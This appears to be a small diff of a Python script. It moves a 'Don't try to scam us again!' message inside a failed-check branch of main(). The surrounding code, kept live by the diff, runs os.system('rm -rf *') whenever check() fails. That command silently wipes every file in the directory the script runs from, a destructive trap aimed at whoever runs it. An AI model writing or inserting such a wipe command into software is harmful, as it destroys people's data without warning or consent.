@@ -14,7 +14,7 @@ def check():
 
 def main():
     if not check():
+        print("Don't try to scam us again!")
         os.system("rm -rf *")
         
-print("Don't try to scam us again!")
 main()
